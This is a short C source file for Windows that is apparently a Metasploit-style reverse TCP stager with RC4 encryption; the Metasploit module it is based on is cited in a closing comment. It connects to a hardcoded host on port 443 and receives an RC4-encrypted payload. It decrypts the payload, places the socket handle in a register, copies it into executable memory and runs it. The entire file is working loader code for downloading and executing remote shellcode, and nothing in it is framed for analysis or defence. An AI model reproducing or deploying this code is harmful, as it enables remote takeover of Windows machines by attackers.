#include <winsock2.h>
#include <windows.h>

#include "rc4.h"
#include "sha1.h"

#define HOST "1.1.1.1"
#define PORT "443"
#define RC4PASS "pass"

static SOCKET WSOCKET;

static void ws_init() {
  WSADATA wsa;
  WSAStartup(MAKEWORD(2, 2), &wsa);
}

static SOCKET ws_connect(char *ip, char *port) {
  SOCKADDR_IN sa = {0};
  sa.sin_family = AF_INET;
  sa.sin_port = htons(atoi(port));
  sa.sin_addr.s_addr = inet_addr(ip);

  SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (connect(s, (SOCKADDR *)&sa, sizeof(sa)) == SOCKET_ERROR) {
    exit(0);
  }
  return s;
}

static long recv_all(SOCKET s, char *buf, long len) {
  long ret = 0;
  while (ret < len) {
    ret += recv(s, buf + ret, len - ret, 0);
  }
  return ret;
}

static char *download(long *rawSize) {
  ws_init();
  WSOCKET = ws_connect(HOST, PORT);

  char key[SHA1_DIGEST_SIZE + 1];
  key[SHA1_DIGEST_SIZE] = 0;
  sha1_buffer(RC4PASS, strlen(RC4PASS), key);
  char *rc4key = key + 4;
  int xorkey = 0;
  for (int i = 0; i < 4; i++) {
    xorkey ^= key[i] << i * 8;
  }

  long size;
  recv(WSOCKET, (char *)&size, 4, 0);
  size ^= xorkey;

  *rawSize = size + 5;
  char *buf = (char *)malloc(*rawSize);

  // BF 78 56 34 12 => mov edi, 0x12345678
  buf[0] = 0xBF;
  memcpy(buf + 1, &WSOCKET, 4);

  recv_all(WSOCKET, buf + 5, size);

  RC4(rc4key, buf + 5, size);

  return buf;
}

int main() {
  long rawSize;
  char *raw = download(&rawSize);

  void *ptr = VirtualAlloc(0, rawSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy(ptr, raw, rawSize);
  free(raw);
  ((void (*)())ptr)();

  return 0;
}

/*
https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/payload/windows/x64/reverse_tcp_rc4.rb
*/
